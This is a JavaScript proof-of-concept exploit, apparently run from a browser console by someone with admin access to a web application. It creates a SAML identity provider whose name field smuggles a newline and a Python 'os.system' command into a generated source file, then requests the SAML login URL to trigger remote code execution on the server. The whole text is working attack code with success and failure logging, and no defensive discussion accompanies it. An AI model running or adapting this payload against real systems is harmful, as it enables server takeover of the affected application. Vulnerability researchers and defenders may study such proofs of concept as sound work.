 (function() {
     function getCookie(n){let b=document.cookie.match('(^|;)\\s*'+n+'\\s*=\\s*([^;]+)');return b?b.pop():''}
     const id = Math.floor(Math.random() * 9999);
     const slug = 'rce-' + id;

     // The payload: using \n explicitly to break the comment line in the .py file
     const name = `Exploit${id}\nimport os;os.system("id > /tmp/rce.txt")`;

     const formData = new FormData();
     formData.append('csrfmiddlewaretoken', getCookie('csrftoken'));
     formData.append('name', name);
     formData.append('slug', slug);
     formData.append('protocol', 'saml');
     formData.append('status', 'active');
     formData.append('priority', '0');
     formData.append('use_custom_attribute_map', 'on');
     formData.append('attribute_mapping', '{"email":["mail"]}');
     formData.append('saml_metadata_xml', `<?xml version="1.0"?><md:EntityDescriptor xmlns:md="urn:oasis:names:tc:SAML:2.0:metadata" entityID="http://x.com"><md:IDPSSODescriptor
 protocolSupportEnumeration="urn:oasis:names:tc:SAML:2.0:protocol"><md:SingleSignOnService Binding="urn:oasis:names:tc:SAML:2.0:bindings:HTTP-Redirect"
 Location="http://x.com/sso"/></md:IDPSSODescriptor></md:EntityDescriptor>`);
     formData.append('_save', 'Save');

     console.log("Creating Identity Provider...");
     fetch('/admin/uac/identityprovider/add/', { method: 'POST', body: formData })
     .then(r => {
         if (r.ok || r.status === 200) {
             console.log("IDP Created Successfully. Slug: " + slug);
             const triggerUrl = '/saml2/login/' + slug + '/'; // Note the trailing slash
             console.log("Triggering RCE via: " + triggerUrl);

             // Trigger the RCE
             return fetch(triggerUrl);
         } else {
             throw new Error("POST failed with status: " + r.status);
         }
     })
     .then(r => {
         if (r.status === 404) {
             console.error("FAILED: Trigger URL returned 404. The IDP might be inactive or protocol is not SAML.");
         } else {
             console.log("RCE Triggered! Response code: " + r.status);
             console.log("Check the container now: ls -l /tmp/rce.txt");
         }
     })
     .catch(e => console.error(e));
 })();

